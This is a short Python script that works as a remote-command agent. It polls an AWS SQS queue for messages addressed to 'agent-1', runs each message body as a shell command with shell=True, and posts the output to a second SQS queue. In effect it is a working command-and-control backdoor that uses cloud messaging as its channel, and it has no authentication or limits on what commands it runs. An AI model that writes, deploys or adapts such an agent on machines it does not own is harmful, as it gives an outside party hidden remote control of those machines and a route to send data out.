import subprocess
import time
import boto3
import uuid
import json

unique_id = uuid.uuid4()
timestamp = int(time.time() * 1000)
agent_id = 'agent-1'

# Initialize AWS SQS client
sqs = boto3.client('sqs', region_name='eu-north-1')
sendqueue_url = 'https://sqs.eu-north-1.amazonaws.com/701545181846/Agent'
receivequeue_url = 'https://sqs.eu-north-1.amazonaws.com/701545181846/Server'


def run_command(command):
    try:
        # Run the command and capture the output
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return output
    except subprocess.CalledProcessError as e:
        # If the command execution fails, return the error message
        return f"Error: {e.output}"

while True:
    # Receive messages from SQS queue
    response = sqs.receive_message(QueueUrl=receivequeue_url, MaxNumberOfMessages=1)

    # Process received messages
    if 'Messages' in response:
        for message in response.get('Messages', []):
            message_body = json.loads(message['Body'])  # Parse the JSON string to a dictionary
            received_agent_id = message_body.get('agent_id')
            if received_agent_id == agent_id:
                message_content = message_body.get('message')
                # Execute the command
                response_message = run_command(message_content)

                # Send the response back to the server
                sqs.send_message(QueueUrl=sendqueue_url, MessageBody=response_message)

                # Delete the message from the queue
                sqs.delete_message(QueueUrl=receivequeue_url, ReceiptHandle=message['ReceiptHandle'])
    time.sleep(5)  # Wait for a while before checking for new messages again